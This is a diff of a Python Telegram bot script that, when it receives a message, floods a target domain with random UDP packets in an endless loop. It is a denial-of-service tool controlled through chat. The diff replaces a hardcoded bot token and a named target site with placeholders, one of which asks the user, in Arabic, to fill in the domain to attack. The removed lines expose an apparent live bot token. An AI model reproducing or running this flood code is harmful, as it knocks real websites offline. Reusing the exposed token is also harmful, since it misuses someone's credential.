@@ -6,7 +6,7 @@ import random
 
 import telebot
 
-bot = telebot.TeleBot("5036121723:AAFLo-MjCJjxs657KPnrnS1tEo3jm54phXw")
+bot = telebot.TeleBot("token bot")
 
 print("- [ ! ] Bot Running Now .")
 
@@ -22,12 +22,10 @@ def echo_all(message):
 
  bytes = random._urandom(1490)
   
- bot.reply_to(message, "done start attack")
+ bot.reply_to(message, "بدء")
  
  while True : 
 
-     sock.sendto(bytes, (socket.gethostbyname("ramy-essa.com"), 5000))
+     sock.sendto(bytes, (socket.gethostbyname("اكتب الدومين هنا"), 5000))
 
 bot.polling(True)
-
-bot.reply_to(message, "stop attack")
